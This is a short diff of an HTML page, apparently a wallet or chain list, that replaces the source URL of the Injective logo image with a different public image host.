@@ -1054,7 +1055,7 @@ body::before {
                         <span class="wallet-dot"></span>
                         <span class="wallet-name">Injective</span>
                     </div>
-                    <img src="https://cryptologos.cc/logos/injective-inj-logo.png" alt="Injective" class="wallet-logo">
+                    <img src="https://assets.coingecko.com/coins/images/12882/small/Secondary_Symbol.png" alt="Injective" class="wallet-logo">
                 </a>
 
             </div>
